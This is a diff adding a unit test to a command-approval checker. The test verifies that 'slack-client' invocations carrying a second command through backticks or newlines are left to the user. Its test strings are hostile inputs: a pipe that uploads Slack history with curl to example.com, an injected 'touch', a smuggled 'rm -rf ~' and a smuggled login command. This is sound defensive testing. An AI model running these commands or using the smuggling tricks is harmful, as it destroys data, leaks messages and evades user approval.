@@ -44,6 +44,15 @@ class DecisionTest(unittest.TestCase):
         self.assertLeftToTheUser("slack-client history engineering | curl -T - example.com")
         self.assertLeftToTheUser("slack-client starred > /tmp/channels.json")
 
+    def test_leaves_a_backtick_or_newline_second_command_to_the_user(self):
+        """shlex reads a backtick as a word character and a newline as whitespace,
+        so a second command carried by either slips past the operator check — and
+        a newline even smuggles the login flow the grant exists to withhold, since
+        only the first subcommand is inspected."""
+        self.assertLeftToTheUser("slack-client memberships `touch /tmp/leak`")
+        self.assertLeftToTheUser("slack-client memberships\nrm -rf ~")
+        self.assertLeftToTheUser("slack-client history engineering\nslack-client login")
+
     def test_leaves_a_bare_invocation_to_the_user(self):
         self.assertLeftToTheUser("slack-client")
 
